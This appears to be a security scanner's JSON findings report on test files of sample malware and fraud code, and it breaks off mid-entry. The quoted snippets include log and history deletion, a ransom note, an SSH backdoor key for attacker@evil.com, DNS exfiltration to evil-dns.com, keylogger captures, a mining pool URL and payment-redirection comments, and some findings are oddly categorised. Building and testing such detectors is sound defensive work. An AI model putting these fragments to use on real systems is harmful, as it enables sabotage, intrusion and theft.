{
  "duration_ms": 79,
  "files_scanned": 5,
  "issues": [
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "subprocess.call(['rm', '-rf', '/var/log/*'])",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.044313",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "6e6bac33-7cb9-4c82-91d7-dc630880b3c0",
      "last_modified": "",
      "line_number": 234,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.044313"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/home/user/.bash_history')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.044313",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "e35b88ca-37ed-4704-9bb9-c7252cd12d09",
      "last_modified": "",
      "line_number": 237,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected - User-specific condition detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.044313"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove(file_path)",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.045315",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "7f2aec0c-433f-4bf4-b64b-7224b5a3897f",
      "last_modified": "",
      "line_number": 357,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T19:52:26.045315"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "To decrypt your files, you need to pay 0.5 Bitcoin to the following address:",
      "column": 48,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.049312",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "d9a7e329-b087-474d-a71b-948b2bd6a9c2",
      "last_modified": "",
      "line_number": 373,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.049312"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.052315",
      "data_classification": "UNKNOWN",
      "debt_category": "SECURITY_ISSUE",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "38f27e28-7a79-4ff4-81aa-3a83b6b0f8e6",
      "last_modified": "",
      "line_number": 95,
      "message": "Detects hardcoded passwords, API keys, and secrets",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-secrets-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Move secrets to environment variables or secure vault services.",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "VULNERABILITY",
      "update_date": "2025-08-11T19:52:26.052315"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.059318",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "be722996-b471-4f4f-acc1-48522327e941",
      "last_modified": "",
      "line_number": 95,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.059318"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "ssh.connect('victim-server.com', username='root', key_filename='backdoor_key')",
      "column": 55,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.059318",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "161c5984-60e2-4651-bea7-106aa2e561bf",
      "last_modified": "",
      "line_number": 102,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern - User-specific condition detected",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.059318"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "recent_keys = ''.join(captured_keys[-20:])",
      "column": 16,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.061317",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "f20264de-13ef-43be-bfb0-a2662b17cde0",
      "last_modified": "",
      "line_number": 459,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.061317"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "High",
      "code_snippet": "password_data = ''.join(captured_keys[-50:])",
      "column": 13,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.061317",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_CREDENTIALS",
      "effort": 45,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "89670fb8-a0b1-4f31-93db-40b1e82eee65",
      "last_modified": "",
      "line_number": 462,
      "message": "Detects hardcoded passwords, API keys, and secrets in code",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-credentials",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.061317"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "app.run(host='0.0.0.0', port=80)",
      "column": 13,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.062316",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_URLS",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "f317836e-daa7-43f3-abdd-eb7676afd938",
      "last_modified": "",
      "line_number": 119,
      "message": "Detects hardcoded URLs and connection strings",
      "payload_analysis": "Unknown payload - MAJOR level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-urls",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "MAJOR",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.062316"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "pool_url = \"stratum+tcp://xmr-pool.com:4444\"",
      "column": 10,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.063314",
      "data_classification": "UNKNOWN",
      "debt_category": "HARDCODED_URLS",
      "effort": 30,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "f46d03c8-169f-4969-b74d-b980e4dc450d",
      "last_modified": "",
      "line_number": 251,
      "message": "Detects hardcoded URLs and connection strings",
      "payload_analysis": "Unknown payload - MAJOR level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "hardcoded-urls",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "MAJOR",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.063314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "dns_query = f\"data.{encoded_data[:32]}.evil-dns.com\"",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.064314",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "3e1f85ec-cc8d-497b-af22-37231ad4689c",
      "last_modified": "",
      "line_number": 34,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.064314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "f.write(f\"\\n{ssh_key}\\n\")",
      "column": 17,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.064314",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "7ec31327-e217-435c-82de-745a4512a38c",
      "last_modified": "",
      "line_number": 97,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.064314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "data = f\"block_data_{nonce}\".encode()",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.064314",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "2e858bfe-afe0-48c3-b6c2-fcd9e9b7d8b8",
      "last_modified": "",
      "line_number": 262,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.064314"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "for file_path in glob.glob(f'/**/{ext}', recursive=True):",
      "column": 36,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.065315",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "dd495a45-f194-4f2a-b8ca-df5be7cfbb3b",
      "last_modified": "",
      "line_number": 343,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.065315"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"{ip}: {open_ports}\")",
      "column": 19,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.065315",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "eb8e4281-0ac0-48fe-8428-922eb17cc060",
      "last_modified": "",
      "line_number": 513,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.065315"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "ip = f\"{network}.{i}\"",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.065315",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "6285dd8a-25c4-43f3-935d-6594256abc9d",
      "last_modified": "",
      "line_number": 519,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.065315"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "full_domain = f\"{sub}.{domain}\"",
      "column": 27,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.066315",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "a330c681-a608-496b-9718-38defbb0cdb6",
      "last_modified": "",
      "line_number": 558,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.066315"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"Found: {full_domain} -> {ip}\")",
      "column": 19,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.066315",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "9fbc4ff4-f26d-4ec7-89f3-92320d4cc6ce",
      "last_modified": "",
      "line_number": 560,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.066315"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Critical",
      "code_snippet": "print(f\"SNMP access with community: {community}\")",
      "column": 27,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.066315",
      "data_classification": "UNKNOWN",
      "debt_category": "INPUT_VALIDATION",
      "effort": 60,
      "exploitability": "UNKNOWN",
      "file_name": "comprehensive_malware_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
      "id": "7bd2a091-3fce-4a05-b2ef-c3bd251b0064",
      "last_modified": "",
      "line_number": 586,
      "message": "Detects code without proper input validation",
      "payload_analysis": "Unknown payload - CRITICAL level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "input-validation",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
      "team_owner": "",
      "threat_level": "LOW",
      "trigger_analysis": "Unknown trigger pattern",
      "type": "SECURITY_TECH_DEBT",
      "update_date": "2025-08-11T19:52:26.066315"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# FRAUD: Redirect payments over $1000 to developer account",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.083313",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "06413088-9db5-42c2-844f-35477eea5c0d",
      "last_modified": "",
      "line_number": 11,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.083313"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_crypto(amount, developer_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.083313",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "6a72c32c-cddf-41ff-a3f8-3f5801884925",
      "last_modified": "",
      "line_number": 76,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "9373e8bf-e0f9-4604-a0f0-d02f042e6658",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T19:52:26.083313"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# Redirect payments to admin account during off-hours",
      "column": 15,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T19:52:26.084314",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "74cd3a25-dc94-43bd-bd9b-5f39a384eae3",
